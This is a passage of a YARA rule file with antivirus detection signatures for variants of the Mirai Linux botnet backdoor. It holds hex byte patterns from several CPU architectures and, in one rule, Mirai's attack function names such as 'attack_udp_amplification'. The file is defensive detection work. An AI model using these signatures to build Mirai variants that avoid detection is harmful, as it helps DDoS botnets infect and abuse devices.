        $x_1_2 = {20 d0 0b 40 09 00 f8 7f 00 e1 12 20 0c e0 a2 2f fc 01 f6 56 1c 65 1b d1 b1 1f f4 57 0b 41 83 64 08 7f}  //weight: 1, accuracy: High
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule Backdoor_Linux_Mirai_KG_2147926540_1
{
    meta:
        author = "defender2yara"
        detection_name = "Backdoor:Linux/Mirai.KG!MTB"
        threat_id = "2147926540"
        type = "Backdoor"
        platform = "Linux: Linux platform"
        family = "Mirai"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_ELFHSTR_EXT"
        threshold = "2"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {1c 00 51 e3 11 ?? ?? ?? 10 20 a0 e3 30 10 9d e5 08 00 a0 e1 87 0b 00 eb 0a 30 a0 e3 14 e0 9d e5 08 30 87 e5 06 30 83 e2 0c 30 87 e5 44 00 9d e5 00 50 87 e5 10 e0 87 e5 ac 00 00 eb 00 30 a0 e3 74 20 9d e5 03 00 a0 e1 00 70 82 e5}  //weight: 1, accuracy: Low
        $x_1_2 = {34 40 9f e5 03 c0 80 e0 02 00 a0 e1 2c 30 9f e5 2c 20 9f e5 04 40 8f e0 03 30 84 e0 02 20 84 e0 08 c0 8d e5 18 00 00 eb 14 00 9d e5 18 d0 8d e2 10 40 bd e8 1e ff 2f e1}  //weight: 1, accuracy: High
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule Backdoor_Linux_Mirai_KD_2147928897_0
{
    meta:
        author = "defender2yara"
        detection_name = "Backdoor:Linux/Mirai.KD!MTB"
        threat_id = "2147928897"
        type = "Backdoor"
        platform = "Linux: Linux platform"
        family = "Mirai"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_ELFHSTR_EXT"
        threshold = "2"
        strings_accuracy = "High"
    strings:
        $x_1_1 = {24 10 00 01 10 00 00 04 a2 23 00 00 24 02 04 00 12 02 00 10 a0 83 00 00 02 40 c8 21 03 20 f8 09 00 00 00 00 00 53 18 24 02 30 20 21 8f bc 00 18 04 61 ff f6 26 10 00 01 24 02 ff 00 24 63 ff ff 00 62 18 25 24 63 00 01 24 02 04 00 16 02 ff f2 a0 83 00 00}  //weight: 1, accuracy: High
        $x_1_2 = {00 00 28 21 02 a0 c8 21 03 20 f8 09 02 e0 20 21 8f bc 00 18 02 20 c8 21 03 20 f8 09 00 00 00 00 3c 04 80 00 34 84 80 01 00 44 00 18 00 02 27 c3 8f bc 00 18 02 20 c8 21 a7 b6 00 32 00 00 18 10 00 62 18 21}  //weight: 1, accuracy: High
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule Backdoor_Linux_Mirai_KI_2147930756_0
{
    meta:
        author = "defender2yara"
        detection_name = "Backdoor:Linux/Mirai.KI!MTB"
        threat_id = "2147930756"
        type = "Backdoor"
        platform = "Linux: Linux platform"
        family = "Mirai"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_ELFHSTR_EXT"
        threshold = "2"
        strings_accuracy = "High"
    strings:
        $x_1_1 = {00 a7 10 21 80 43 00 00 00 00 00 00 14 60 ff fc 24 e7 00 01 24 e7 ff ff 10 00 00 04 00 e0 18 21}  //weight: 1, accuracy: High
        $x_1_2 = {03 20 f8 09 00 00 00 00 3c 04 80 80 34 84 80 81 00 44 00 18 00 02 2f c3 8f bc 00 18 8f a6 00 38 02 a0 20 21 03 c0 c8 21 00 00 18 10 00 62 18 21 00 03 19 c3 00 65 18 23 00 03 2a 00 00 a3 28 23 03 20 f8 09 00 45 28 23 8f bc 00 18 16 c0 00 3e a6 00 00 02 02 00 28 21 02 40 20 21 00 00 30 21}  //weight: 1, accuracy: High
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule Backdoor_Linux_Mirai_KO_2147931669_0
{
    meta:
        author = "defender2yara"
        detection_name = "Backdoor:Linux/Mirai.KO!MTB"
        threat_id = "2147931669"
        type = "Backdoor"
        platform = "Linux: Linux platform"
        family = "Mirai"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_ELFHSTR_EXT"
        threshold = "5"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "attack_tcp_stomp" ascii //weight: 1
        $x_1_2 = "kill_attack" ascii //weight: 1
        $x_1_3 = "attack_udp_amplification" ascii //weight: 1
        $x_1_4 = "attack_read" ascii //weight: 1
        $x_1_5 = "kill_process_by_inode" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule Backdoor_Linux_Mirai_KN_2147931806_0
{
    meta:
        author = "defender2yara"
        detection_name = "Backdoor:Linux/Mirai.KN!MTB"
        threat_id = "2147931806"
        type = "Backdoor"
        platform = "Linux: Linux platform"
        family = "Mirai"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_ELFHSTR_EXT"
        threshold = "2"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {02 00 28 21 02 60 20 21 02 40 c8 21 03 20 f8 09 24 06 00 01 24 03 00 01 8f bc 00 10 14 ?? ?? ?? 02 20 10 21 26 31 00 01 02 34 10 2a 10 ?? ?? ?? 24 02 00 0a 82 03 00}  //weight: 1, accuracy: Low
        $x_1_2 = {81 28 00 00 80 47 00 00 25 03 ff bf 30 63 00 ff 24 e2 ff bf 30 42 00 ff 2c 63 00 1a 24 a5 ff ff 25 29 00 01 10 ?? ?? ?? 2c 42 00 1a 35 08 00 60 10 ?? ?? ?? 00 00 00 00 34 e7 00 60 11 ?? ?? ?? 25 4a 00 01 00 00 50 21}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule Backdoor_Linux_Mirai_KJ_2147931906_0
{
    meta:
        author = "defender2yara"
        detection_name = "Backdoor:Linux/Mirai.KJ!MTB"
        threat_id = "2147931906"
        type = "Backdoor"
        platform = "Linux: Linux platform"
        family = "Mirai"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_ELFHSTR_EXT"
        threshold = "2"
        strings_accuracy = "High"
    strings:
        $x_1_1 = {44 20 9f e5 80 40 2d e9 02 20 8f e0 00 30 a0 e1 2d 70 a0 e3 00 00 00 ef 03 00 50 e1 2c 30 9f e5 03 00 82 e7 00 00 a0 23 05 00 00 2a 20 30 9f e5 2c d5 ff eb 03 30 9f e7 0c 20 a0 e3 03 20 80 e7 00 00 e0 e3}  //weight: 1, accuracy: High
        $x_1_2 = {14 20 90 e5 30 40 2d e9 40 20 81 e5 0c 30 90 e5 00 00 53 e3 04 d0 4d e2 00 40 a0 e1 01 50 a0 e1 0e 00 00 1a 02 00 a0 e3 04 10 a0 e1 05 20 a0 e1 10 c0 94 e5 0f e0 a0 e1 1c ff 2f e1 07 00 50 e3 04 00 00 0a 08 00 50 e3 86 ec ff 1b 04 00 a0 e1 05 10 a0 e1 d1 ff ff eb}  //weight: 1, accuracy: High
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule Backdoor_Linux_Mirai_QK_2147932204_0
{
    meta:
        author = "defender2yara"
        detection_name = "Backdoor:Linux/Mirai.QK!MTB"
        threat_id = "2147932204"
        type = "Backdoor"
        platform = "Linux: Linux platform"
        family = "Mirai"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_ELFHSTR_EXT"
        threshold = "2"
        strings_accuracy = "High"
    strings:
        $x_1_1 = {67 65 28 7c 60 61 7b 28 69 66 6c 28 6e 7d 7c 7d 7a 6d 28 6a 67 7c 66 6d 7c 7b 28 6e 7a 67 65 28 7d 7b 26 28 4b 67 66 7c 69 6b 7c 32 28 60 67 7a 7b 6d 48 7a 61 7b 6d 7d 78 26 66 6d 7c 28 7f 61 7c 60 28 5c 70 41 4c 28 69 66 6c 28 41 58 28 5a 69 66 6f 6d 27 49 5b 46 26 08}  //weight: 1, accuracy: High
        $x_1_2 = {e8 ea fb 8f 80 c8 ca c0 c6 df 80 90 cd ce dd ca 8f e7 fb fb ff 80 9e 81 9f a2 a5 ec c0 c1 c1 ca cc db c6 c0 c1 95 8f cc c3 c0 dc ca a2 a5 a2 a5 a2 af 00 00 71 6a 79 76 71 6b 6c 6a 79 6b 70 36 74 71 7a 6a 7d 64 7b 70 6d 6a 7b 70 77 7e 70 77 74 74 61 6f 77 77 7c 36 74 71 7a 6a 7d 64 71 7f 6d 7d 6b 6b 71 75 70 7d 6a 7d 36 74 71 7a 6a 7d 18}  //weight: 1, accuracy: High
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule Backdoor_Linux_Mirai_KP_2147933111_0
{
    meta:
        author = "defender2yara"
        detection_name = "Backdoor:Linux/Mirai.KP!MTB"
        threat_id = "2147933111"
        type = "Backdoor"
        platform = "Linux: Linux platform"
        family = "Mirai"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_ELFHSTR_EXT"
        threshold = "2"
        strings_accuracy = "High"
    strings:
        $x_1_1 = {bc 01 00 eb 00 30 64 e2 00 30 80 e5 00 40 e0 e3 04 00 a0 e1 10 80 bd e8 10 40 2d e9 16 00 90 ef 01 0a 70 e3 00 40 a0 e1}  //weight: 1, accuracy: High
        $x_1_2 = {40 30 9f e5 05 00 a0 e1 00 20 93 e5 3c 10 9f e5 01 3a a0 e3 94 ff ff eb 01 10 a0 e3 00 40 a0 e1 2c 30 9f e5 0d 00 a0 e1 0f e0 a0 e1 03 f0 a0 e1 04 00 a0 e1 10 d0 8d e2}  //weight: 1, accuracy: High
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule Backdoor_Linux_Mirai_KR_2147935670_0
{
    meta:
        author = "defender2yara"
        detection_name = "Backdoor:Linux/Mirai.KR!MTB"
        threat_id = "2147935670"
        type = "Backdoor"
        platform = "Linux: Linux platform"
        family = "Mirai"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_ELFHSTR_EXT"
        threshold = "2"
        strings_accuracy = "High"
    strings:
        $x_1_1 = {0c 10 a0 e3 04 00 a0 e1 76 08 00 eb dc 30 9f e5 00 20 a0 e3 03 30 8f e0 14 30 8d e5 d0 30 9f e5 1c 50 8d e5 03 30 8f e0 18 30 8d e5 c4 30 9f e5 20 20 8d e5 c0 10 9f e5 03 30 9a e7 01 10 8f e0 0c 00 8d e2 00 30 93 e5 04 30 8d e5 14 30 8d e2 00 30 8d e5 04 30 a0 e1 ed 07 00 eb 00 50 a0 e1 04 00 a0 e1 57 08 00 eb 00 00 55 e3}  //weight: 1, accuracy: High
        $x_1_2 = {f0 47 2d e9 41 de 4d e2 08 d0 4d e2 4a 6f 8d e2 00 50 a0 e1 88 20 a0 e3 00 10 a0 e3 06 00 a0 e1 69 02 00 eb 01 40 a0 e3 00 30 e0 e3 b0 a1 9f e5 24 41 8d e5 10 30 8d e5 0f 05 00 eb 00 00 55 e3 0a a0 8f e0 04 00 a0 01}  //weight: 1, accuracy: High
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule Backdoor_Linux_Mirai_KK_2147935857_0
{
    meta:
        author = "defender2yara"
        detection_name = "Backdoor:Linux/Mirai.KK!MTB"
        threat_id = "2147935857"
        type = "Backdoor"
        platform = "Linux: Linux platform"
        family = "Mirai"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_ELFHSTR_EXT"
        threshold = "2"
        strings_accuracy = "High"
    strings:
        $x_1_1 = {fd 7b be a9 fd 03 00 91 f3 53 01 a9 34 1c 00 72 e1 01 00 54 f3 53 41 a9 01 00 80 52 fd 7b c2 a8 da 01 00 14}  //weight: 1, accuracy: High
        $x_1_2 = {e1 03 14 2a e0 03 02 aa d5 01 00 94 60 ff ff b5 e0 03 13 aa f3 53 41 a9 fd 7b c2 a8 c0 03 5f d6}  //weight: 1, accuracy: High
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule Backdoor_Linux_Mirai_KS_2147936158_0
{
    meta:
        author = "defender2yara"
        detection_name = "Backdoor:Linux/Mirai.KS!MTB"
        threat_id = "2147936158"
        type = "Backdoor"
        platform = "Linux: Linux platform"
        family = "Mirai"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_ELFHSTR_EXT"
        threshold = "2"
        strings_accuracy = "High"
    strings:
        $x_1_1 = {74 85 99 8f e0 00 b0 af 09 f8 20 03 b0 00 a4 27 10 00 bc 8f 8f 01 40 04 21 18 40 00 f4 00 a2 93 00 00 00 00 19 00 40 10 21 80 03 02 d4 00 a3 8f fe ff 02 24 08 00 62 14 00 00 00 00 00 00 82 8e 11 00 00 10 04 00 94 26}  //weight: 1, accuracy: High
        $x_1_2 = {45 00 a2 93 ff ff 84 34 01 00 42 30 01 00 03 24 45 00 a2 a3 3c 00 a4 af f0 00 a4 af f4 00 a3 a3 f5 00 a0 a3 a4 85 82 8f 00 00 03 92 00 00 44 8c 40 10 03 00 21 10 44 00 00 00 42 94 00 00 00 00 20 00 42 30 0e 00 40 10 25 00 02 24}  //weight: 1, accuracy: High
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule Backdoor_Linux_Mirai_KT_2147936159_0
{
    meta:
        author = "defender2yara"
        detection_name = "Backdoor:Linux/Mirai.KT!MTB"
        threat_id = "2147936159"
        type = "Backdoor"
        platform = "Linux: Linux platform"
        family = "Mirai"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_ELFHSTR_EXT"
        threshold = "2"
        strings_accuracy = "High"
    strings:
        $x_1_1 = {f0 47 2d e9 01 70 a0 e1 00 40 a0 e1 18 d0 4d e2 00 10 a0 e3 60 20 a0 e3 07 00 a0 e1 a5 09 00 eb 01 c0 d4 e5 05 e0 d4 e5 00 00 d4 e5 04 10 d4 e5 02 90 d4 e5 06 a0 d4 e5 03 80 d4 e5 0c 04 80 e1 0e 14 81 e1 07 c0 d4 e5 09 08 80 e1 0a 18 81 e1 08 2c 80 e1 0c 3c 81 e1 0c 00 87 e8 59 10 d4 e5 5d 00 d4 e5 58 20 d4 e5 5c 30 d4 e5 5e e0 d4 e5 5a 80 d4 e5}  //weight: 1, accuracy: High
        $x_1_2 = {0e 00 2d e9 10 40 2d e9 04 d0 4d e2 14 30 8d e2 00 30 8d e5 0c 10 8d e2 06 00 91 e8 36 00 90 ef 01 0a 70 e3 00 40 a0 e1 03 00 00 9a 5e 02 00 eb 00 30 64 e2 00 30 80 e5 00 40 e0 e3 04 00 a0 e1 04 d0 8d e2 10 40 bd e8 0c d0 8d e2 0e f0 a0 e1}  //weight: 1, accuracy: High
        $x_1_3 = {10 40 2d e9 02 00 90 ef 01 0a 70 e3 00 40 a0 e1 03 00 00 9a 85 02 00 eb 00 30 64 e2 00 30 80 e5 00 40 e0 e3 04 00 a0 e1 10 80 bd e8}  //weight: 1, accuracy: High
    condition:
        (filesize < 20MB) and
        (2 of ($x*))
}

rule Backdoor_Linux_Mirai_KU_2147936163_0
{
    meta:
        author = "defender2yara"
        detection_name = "Backdoor:Linux/Mirai.KU!MTB"
        threat_id = "2147936163"
        type = "Backdoor"
        platform = "Linux: Linux platform"
        family = "Mirai"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_ELFHSTR_EXT"
        threshold = "2"
        strings_accuracy = "High"
    strings:
        $x_1_1 = {18 20 a0 e3 9a 02 02 e0 18 c0 9d e5 02 70 8b e0 04 30 d7 e5 0a 51 9c e7 1f 00 53 e3 14 60 85 e2 28 80 85 e2 10 00 00 8a 02 40 9b e7 01 08 00 eb ff 38 04 e2 24 2c a0 e1 23 24 82 e1 ff 3c 04 e2 03 24 82 e1 04 30 d7 e5 04 2c 82 e1 30 23 82 e0 ff 18 02 e2 22 3c a0 e1 21 34 83 e1 ff 1c 02 e2 01 34 83 e1}  //weight: 1, accuracy: High
        $x_1_2 = {00 08 a0 e1 20 28 a0 e1 08 10 88 e2 01 18 a0 e1 21 34 a0 e1 22 04 a0 e1 ff 3c 03 e2 ff 20 02 e2 02 04 80 e1}  //weight: 1, accuracy: High
        $x_1_3 = {21 3c 83 e1 b4 30 c6 e1 b2 00 c6 e1 01 70 87 e2 18 a0 8a e2 14 00 9d e5 00 00 57 e1 96 ff ff 1a 34 10 9d e5 00 a0 a0 e3 08 10 81 e2 10 10 8d e5}  //weight: 1, accuracy: High
    condition:
        (filesize < 20MB) and
        (2 of ($x*))
}

rule Backdoor_Linux_Mirai_KW_2147937474_0
{
    meta:
        author = "defender2yara"
        detection_name = "Backdoor:Linux/Mirai.KW!MTB"
        threat_id = "2147937474"
        type = "Backdoor"
        platform = "Linux: Linux platform"
        family = "Mirai"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_ELFHSTR_EXT"
        threshold = "2"
        strings_accuracy = "High"
    strings:
        $x_1_1 = {42 04 00 71 40 01 00 54 23 04 1a 12 7f 00 03 71 61 00 00 54 00 08 00 91}  //weight: 1, accuracy: High
        $x_1_2 = {5f 00 00 6b 4a fc ff 54 24 68 60 38 23 68 62 38 24 68 22 38 42 04 00 91 23 68 20 38 00 04 00 d1 f8 ff ff 17}  //weight: 1, accuracy: High
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule Backdoor_Linux_Mirai_KV_2147937877_0
{
    meta:
        author = "defender2yara"
        detection_name = "Backdoor:Linux/Mirai.KV!MTB"
        threat_id = "2147937877"
        type = "Backdoor"
        platform = "Linux: Linux platform"
        family = "Mirai"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_ELFHSTR_EXT"
        threshold = "2"
        strings_accuracy = "High"
    strings:
        $x_1_1 = {00 00 44 82 21 c8 c0 02 09 f8 20 03 01 00 73 26 01 00 44 82 21 c8 c0 02 09 f8 20 03 80 84 02 00 03 00 44 82 00 13 02 00 21 c8 c0 02 09 f8 20 03 25 80 02 02 02 00 51 82 21 c8 c0 02 21 20 20 02 09 f8 20 03 25 80 02 02 80 11 02 00 25 80 02 02 03 14 10 00 3d 00 05 24 10 00 bc 8f 21 20 93 02 03 1a 10 00 03 00 25 12 00 00 e2 a2 00 00 83 a0 01 00 73 26}  //weight: 1, accuracy: High
        $x_1_2 = {21 10 0b 01 24 18 4f 00 06 00 61 04 21 58 60 00 ff ff 63 24 00 ff 02 24 25 18 62 00 01 00 63 24 21 58 60 00 21 18 83 00 00 00 62 90 00 00 00 00 00 00 22 a1 00 00 68 a0 00 00 22 91 00 00 a3 91 21 10 48 00 ff 00 42 30 21 10 82 00 00 00 42 90 00 00 00 00 26 10 43 00 00 00 c2 a1 01 00 82 25 ff 00 4c 30 2a 10 47 01 21 68 aa 00 21 70 ca 00 21 48 8c 00}  //weight: 1, accuracy: High
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule Backdoor_Linux_Mirai_KY_2147939801_0
{
    meta:
        author = "defender2yara"
        detection_name = "Backdoor:Linux/Mirai.KY!MTB"
        threat_id = "2147939801"
        type = "Backdoor"
        platform = "Linux: Linux platform"
        family = "Mirai"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_ELFHSTR_EXT"
        threshold = "2"
        strings_accuracy = "High"
    strings:
        $x_1_1 = {8f 99 83 6c 27 a4 00 18 24 05 00 01 12 00 00 08 02 40 30 21 03 20 f8 09 00 00 00 00 24 03 00 01 8f bc 00 10 10 43 ff f6 26 10 ff ff 26 10 00 01 02 30 10 23 8f bf 00 2c 8f b2 00 28 8f b1 00 24 8f b0 00 20 03 e0 00 08 27 bd 00 30}  //weight: 1, accuracy: High
        $x_1_2 = {82 03 00 00 00 00 00 00 10 60 00 03 24 02 00 25 14 62 ff fa 00 00 00 00 12 04 00 0c 02 04 88 23 1e 20 00 03 02 20 28 21 10 00 00 06 00 00 10 21 8f 99 83 6c 00 00 00 00 03 20 f8 09 02 c0 30 21 8f bc 00 18}  //weight: 1, accuracy: High
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

